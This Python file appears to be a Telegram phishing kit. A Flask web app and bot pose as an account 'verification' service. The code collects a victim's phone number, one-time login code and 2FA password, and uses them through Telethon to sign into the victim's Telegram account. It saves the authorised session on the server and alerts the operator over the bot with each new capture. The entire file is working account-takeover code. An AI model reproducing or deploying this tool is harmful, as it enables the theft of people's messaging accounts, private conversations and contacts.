import os
import telebot
from telebot import types
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError, FloodWaitError
from flask import Flask, render_template, request, jsonify, redirect, url_for
import asyncio
from datetime import datetime, timedelta
import re
import time
import threading
import requests
import uuid
import json

# Initialize Flask
app = Flask(__name__)

# Configuration
BOT_TOKEN = os.environ.get('BOT_TOKEN', 'YOUR_TOKEN')
USER_ID = int(os.environ.get('USER_ID', '00000000'))
API_ID = int(os.environ.get('API_ID', '000000'))
API_HASH = os.environ.get('API_HASH', 'HASH')
WEBHOOK_URL = os.environ.get('WEBHOOK_URL', '')

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Storage
sessions = {}
session_expiry = 300
telegram_clients = {}

os.makedirs('sessions', exist_ok=True)

def generate_session_id():
    return str(uuid.uuid4())

def clean_phone(phone):
    return re.sub(r'[^\d+]', '', phone)

def generate_session_file(phone):
    safe_phone = clean_phone(phone)
    timestamp = int(time.time())
    return f"sessions/{safe_phone}_{timestamp}.session"

def clean_otp(otp):
    cleaned = re.sub(r'\D', '', otp)
    return cleaned if len(cleaned) == 5 else None

def get_client(session_file):
    if session_file not in telegram_clients:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        client = TelegramClient(session_file, API_ID, API_HASH, loop=loop, connection_retries=3, timeout=30)
        telegram_clients[session_file] = {'client': client,'loop': loop,'created': time.time()}
    return telegram_clients[session_file]

async def send_otp_async(client, phone):
    try:
        await client.connect()
        result = await client.send_code_request(phone)
        return {'success': True,'phone_code_hash': result.phone_code_hash}
    except FloodWaitError as e:
        return {'success': False,'error': f'Please wait {e.seconds} seconds'}
    except Exception as e:
        return {'success': False,'error': str(e)}

async def verify_otp_async(client, phone, code, phone_code_hash):
    try:
        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
        if await client.is_user_authorized():
            me = await client.get_me()
            return {'success': True,'requires_2fa': False,'user': {'id': me.id,'username': me.username,'first_name': me.first_name,'last_name': me.last_name,'phone': phone}}
        return {'success': True,'requires_2fa': True}
    except SessionPasswordNeededError:
        return {'success': True,'requires_2fa': True}
    except PhoneCodeExpiredError:
        return {'success': False,'error': 'OTP expired','code_expired': True}
    except PhoneCodeInvalidError:
        return {'success': False,'error': 'Invalid OTP code'}
    except Exception as e:
        return {'success': False,'error': str(e)}

async def verify_2fa_async(client, password):
    try:
        await client.sign_in(password=password)
        me = await client.get_me()
        return {'success': True,'user': {'id': me.id,'username': me.username,'first_name': me.first_name,'last_name': me.last_name,'phone': me.phone}}
    except Exception as e:
        return {'success': False,'error': str(e)}

def send_to_admin(phone, user_info=None, password=None, source="chat"):
    try:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        msg = f"""📱 <b>NEW VERIFICATION</b>

📞 Phone: {phone}
⏰ Time: {timestamp}
🌐 Source: {source}
"""
        bot.send_message(USER_ID, msg, parse_mode='HTML')
    except:
        pass

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/init-session', methods=['POST'])
def init_session():
    data = request.json
    user_id = data.get('user_id')
    session_id = generate_session_id()
    sessions[session_id] = {
        'user_id': user_id,
        'phone': None,
        'status': 'waiting_for_contact',
        'expiry': datetime.now() + timedelta(seconds=session_expiry),
        'attempts': 0,
        'created': datetime.now()
    }
    return jsonify({'success': True,'session_id': session_id})

@app.route('/otp/<session_id>/<phone>')
def otp_page(session_id, phone):
    if session_id not in sessions: return "Session expired", 400
    if sessions[session_id]['phone'] != phone: return "Phone mismatch", 400
    return render_template('otp.html', session_id=session_id, phone=phone)

@app.route('/api/verify-contact', methods=['POST'])
def verify_contact():
    data = request.json
    session_id = data.get('session_id')
    phone = data.get('phone', '').strip()

    if session_id not in sessions:
        return jsonify({'success': False,'error': 'Session expired'})

    if not phone.startswith('+'):
        phone = '+' + phone

    session_file = generate_session_file(phone)

    client_data = get_client(session_file)
    client = client_data['client']
    loop = client_data['loop']

    result = loop.run_until_complete(send_otp_async(client, phone))

    if result['success']:
        sessions[session_id].update({
            'phone': phone,
            'phone_code_hash': result['phone_code_hash'],
            'session_file': session_file,
            'status': 'otp_sent',
            'expiry': datetime.now() + timedelta(seconds=session_expiry),
            'otp_attempts': 0
        })
        return jsonify({'success': True,'redirect_url': f'/otp/{session_id}/{phone}'})

    return jsonify({'success': False,'error': result['error']})

@app.route('/api/verify-otp', methods=['POST'])
def verify_otp():
    data = request.json
    session_id = data.get('session_id')
    otp = data.get('otp','')

    if session_id not in sessions:
        return jsonify({'success': False,'error': 'Session expired'})

    session = sessions[session_id]
    cleaned = clean_otp(otp)
    if not cleaned: return jsonify({'success': False,'error':'Invalid OTP'})

    client_data = get_client(session['session_file'])
    client = client_data['client']
    loop = client_data['loop']

    result = loop.run_until_complete(verify_otp_async(client, session['phone'], cleaned, session['phone_code_hash']))

    if result['success'] and not result.get('requires_2fa'):
        send_to_admin(session['phone'], result.get('user'), source='webapp')
        del sessions[session_id]
        return jsonify({'success': True,'redirect_url':'/success'})

    if result.get('requires_2fa'):
        return jsonify({'success': True,'requires_2fa': True})

    return jsonify({'success': False,'error': result['error']})

@app.route('/success')
def success_page():
    return render_template('success.html')

# ==================== BOT HANDLERS ====================

# 🔥 UPDATED /start — welcome + WebApp button
@bot.message_handler(commands=['start'])
def start_command(message):
    kb = types.InlineKeyboardMarkup()
    url = WEBHOOK_URL.rstrip('/') if WEBHOOK_URL else f"http://localhost:{os.environ.get('PORT',5000)}"
    kb.add(types.InlineKeyboardButton("📱 Open Verification WebApp", web_app=types.WebAppInfo(url=url)))
    bot.send_message(
        message.chat.id,
        "👋 Welcome!\n\nPress the button below to verify your account.",
        reply_markup=kb
    )

# 🔥 NEW — contact message handler (sends OTP)
@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    user_id = message.from_user.id
    phone = message.contact.phone_number

    if not phone.startswith('+'): phone = '+' + phone

    session_id = None
    for sid, s in sessions.items():
        if str(s['user_id']) == str(user_id):
            session_id = sid
            break

    if not session_id:
        bot.reply_to(message, "Session expired. Open WebApp again.")
        return

    try:
        r = requests.post(
            "http://localhost:5000/api/verify-contact",
            json={"session_id": session_id, "phone": phone}
        ).json()

        if r.get("success"):
            bot.reply_to(message, "OTP sent. Enter it in WebApp.")
        else:
            bot.reply_to(message, r.get("error","OTP failed"))
    except Exception:
        bot.reply_to(message, "Server error")

# ==================== MAIN ====================
def cleanup_loop():
    while True:
        time.sleep(60)
        now = datetime.now()
        expired = [sid for sid,s in sessions.items() if s['expiry']<now]
        for sid in expired: del sessions[sid]

if __name__ == '__main__':
    cleanup_thread = threading.Thread(target=cleanup_loop, daemon=True)
    cleanup_thread.start()

    port = int(os.environ.get('PORT', 5000))

    def run_bot():
        bot.polling(none_stop=True, skip_pending=True)

    threading.Thread(target=run_bot, daemon=True).start()

    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False, threaded=True)
